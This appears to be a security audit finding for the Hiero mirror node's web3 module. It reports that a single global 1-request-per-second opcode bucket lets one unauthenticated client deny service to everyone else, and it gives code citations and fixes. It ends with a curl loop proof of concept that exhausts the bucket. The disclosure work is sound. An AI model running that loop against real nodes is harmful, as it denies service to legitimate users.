### Title
Global Opcode Rate-Limit Bucket Monopolization — Unauthenticated Single-Client DoS

### Summary
`ThrottleManagerImpl.throttleOpcodeRequest()` enforces a single, process-wide token-bucket with a default capacity of **1 token per second** shared across every caller. Because there is no per-IP or per-client partitioning, any unauthenticated external user who sends one request per second to the opcode endpoint permanently starves all other users of their quota, making historical opcode traces completely inaccessible to legitimate callers.

### Finding Description

**Exact code path:**

`ThrottleConfiguration.opcodeRateLimitBucket()` creates one Spring singleton `Bucket` whose capacity is `throttleProperties.getOpcodeRequestsPerSecond()`, defaulting to `1`:

```
// ThrottleProperties.java line 29
private long opcodeRequestsPerSecond = 1;

// ThrottleConfiguration.java lines 47-55
@Bean(name = OPCODE_RATE_LIMIT_BUCKET)
Bucket opcodeRateLimitBucket() {
    long rateLimit = throttleProperties.getOpcodeRequestsPerSecond();  // = 1
    final var limit = Bandwidth.builder()
            .capacity(rateLimit)
            .refillGreedy(rateLimit, Duration.ofSeconds(1))
            .build();
    return Bucket.builder().addLimit(limit).build();   // single global instance
}
```

`ThrottleManagerImpl.throttleOpcodeRequest()` calls `tryConsume(1)` on that single shared bucket:

```
// ThrottleManagerImpl.java lines 52-56
@Override
public void throttleOpcodeRequest() {
    if (!opcodeRateLimitBucket.tryConsume(1)) {
        throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
    }
}
```

`OpcodesController.getContractOpcodes()` calls this method with **no authentication check** — the only pre-condition is an `Accept-Encoding: gzip` header:

```
// OpcodesController.java lines 59-61
if (properties.isEnabled()) {
    validateAcceptEncodingHeader(acceptEncoding);   // trivially satisfied
    throttleManager.throttleOpcodeRequest();        // consumes global token
```

No `SecurityConfig` exists in the web3 module; there is no IP-based, session-based, or user-based bucket partitioning anywhere in the throttle stack.

**Root cause / failed assumption:** The design assumes the global 1 req/sec ceiling is low enough to prevent abuse, but it does not account for a single client monopolizing the entire budget. Because the bucket is a singleton and `tryConsume` is non-blocking, the first caller each second always wins; every other concurrent caller receives HTTP 429.

**Exploit flow:**
1. Attacker sends `GET /api/v1/contracts/results/<any_valid_or_invalid_hash>/opcodes` with header `Accept-Encoding: gzip` at a rate of ≥1 req/s.
2. Each request consumes the single available token.
3. All legitimate users' requests arrive to an empty bucket and receive `ThrottleException` → HTTP 429.
4. The bucket refills at 1 token/s; the attacker immediately re-consumes it.
5. Legitimate access is permanently denied for as long as the attacker maintains the flood.

**Why existing checks are insufficient:**
- `validateAcceptEncodingHeader` only checks for the string `"gzip"` — trivially satisfied.
- The `rateLimitBucket` (500 req/s) and `gasLimitBucket` are separate beans and are **not** consulted by `throttleOpcodeRequest()`.
- No IP-rate-limiting, no authentication, no connection-level throttle is applied before `throttleOpcodeRequest()` is reached.

### Impact Explanation
Complete denial of service for the `/opcodes` endpoint for all users except the attacker. Historical EVM opcode traces — used for transaction debugging, forensic analysis, and tooling — become entirely unavailable. Because the default quota is 1 req/s globally, even a low-bandwidth attacker (a single HTTP client in a loop) can sustain the attack indefinitely at negligible cost.

### Likelihood Explanation
Preconditions: none. The attacker needs no credentials, no on-chain assets, no internal network access, and no knowledge of valid transaction hashes (any path value is sufficient to consume the token before the service looks up the transaction). The attack is reproducible with a single `curl` command in a loop and is sustainable from a residential internet connection.

### Recommendation
Replace the single global bucket with a **per-source-IP bucket** (e.g., using Bucket4j's `ProxyManager` keyed on `request.getRemoteAddr()` or the `X-Forwarded-For` header behind a trusted proxy). Additionally:
- Enforce a **per-IP connection rate limit** at the servlet filter level before the throttle check.
- Consider requiring authentication for the opcode endpoint given its resource cost.
- Raise the global floor only after per-client fairness is in place.

### Proof of Concept
```bash
# Terminal 1 – attacker (no credentials, no special setup)
while true; do
  curl -s -o /dev/null \
    -H "Accept-Encoding: gzip" \
    "https://<mirror-node-host>/api/v1/contracts/results/0x0000000000000000000000000000000000000000000000000000000000000001/opcodes"
  sleep 0.9   # stay just under 1 req/s to reliably consume every token
done

# Terminal 2 – legitimate user
curl -v \
  -H "Accept-Encoding: gzip" \
  "https://<mirror-node-host>/api/v1/contracts/results/<real_tx_hash>/opcodes"
# Expected result: HTTP 429 "Requests per second rate limit exceeded"
```

The legitimate user in Terminal 2 will receive HTTP 429 for as long as Terminal 1 is running, because the single global `opcodeRateLimitBucket` is exhausted before their request is processed. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3)

### Citations

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleManagerImpl.java (L52-56)
```java
    public void throttleOpcodeRequest() {
        if (!opcodeRateLimitBucket.tryConsume(1)) {
            throw new ThrottleException(REQUEST_PER_SECOND_LIMIT_EXCEEDED);
        }
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/config/ThrottleConfiguration.java (L47-55)
```java
    @Bean(name = OPCODE_RATE_LIMIT_BUCKET)
    Bucket opcodeRateLimitBucket() {
        long rateLimit = throttleProperties.getOpcodeRequestsPerSecond();
        final var limit = Bandwidth.builder()
                .capacity(rateLimit)
                .refillGreedy(rateLimit, Duration.ofSeconds(1))
                .build();
        return Bucket.builder().addLimit(limit).build();
    }
```

**File:** web3/src/main/java/org/hiero/mirror/web3/throttle/ThrottleProperties.java (L28-29)
```java
    @Min(1)
    private long opcodeRequestsPerSecond = 1;
```

**File:** web3/src/main/java/org/hiero/mirror/web3/controller/OpcodesController.java (L59-65)
```java
        if (properties.isEnabled()) {
            validateAcceptEncodingHeader(acceptEncoding);
            throttleManager.throttleOpcodeRequest();

            final var request = new OpcodeRequest(transactionIdOrHash, stack, memory, storage);
            return opcodeService.processOpcodeCall(request);
        }
```
